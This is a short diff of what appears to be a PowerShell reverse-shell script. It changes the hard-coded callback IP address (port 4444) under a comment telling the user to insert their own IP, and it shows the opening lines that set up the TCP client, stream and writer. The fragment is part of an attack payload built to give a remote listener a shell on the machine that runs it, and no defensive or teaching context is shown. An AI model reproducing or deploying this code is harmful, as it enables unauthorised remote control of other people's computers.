@@ -1,5 +1,5 @@
 # Change this line and put your IP
-$socket = new-object System.Net.Sockets.TcpClient('192.168.0.102', 4444);
+$socket = new-object System.Net.Sockets.TcpClient('192.168.8.101', 4444);
 if($socket -eq $null){exit 1}
 $stream = $socket.GetStream();
 $writer = new-object System.IO.StreamWriter($stream);
